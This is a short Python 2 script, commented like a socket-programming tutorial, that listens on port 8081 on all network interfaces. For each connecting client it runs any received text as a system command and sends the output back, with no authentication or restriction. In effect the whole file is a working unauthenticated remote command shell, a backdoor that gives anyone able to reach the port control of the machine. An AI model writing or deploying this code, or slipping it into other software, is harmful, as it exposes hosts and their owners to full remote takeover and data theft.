import socket, sys, subprocess, thread
    
# Defining server address and port
host = ''  #'localhost' or '127.0.0.1' or '' are all same
port = 8081 #Use port > 1024, below it all are reserved
 
#Creating socket object
sock = socket.socket()
#Binding socket to a address. bind() takes tuple of host and port.
sock.bind((host, port))
#Listening at the address
sock.listen(5) #5 denotes the number of clients can queue
 
def clientthread(conn):
#infinite loop so that function do not terminate and thread do not end.
  while True:
  #Receiving from client
    data = conn.recv(1024) # 1024 stands for bytes of data to be received
    if data:
      try:
        process = subprocess.Popen(data.split(), stdout=subprocess.PIPE)
        output = process.communicate()
        conn.sendall('tried: ' + data + 'and got response: ' + str(output) + '\n' )
      except Exception, e:
        conn.sendall('could not try: ' + data + 'and got error: ' + str(e) + '\n' )
 
while True:
#Accepting incoming connections
  conn, addr = sock.accept()
#Creating new thread. Calling clientthread function for this function and passing conn as argument.
  thread.start_new_thread(clientthread,(conn,)) #start new thread takes 1st argument as a function name to be run, second is the tuple of arguments to the function.
 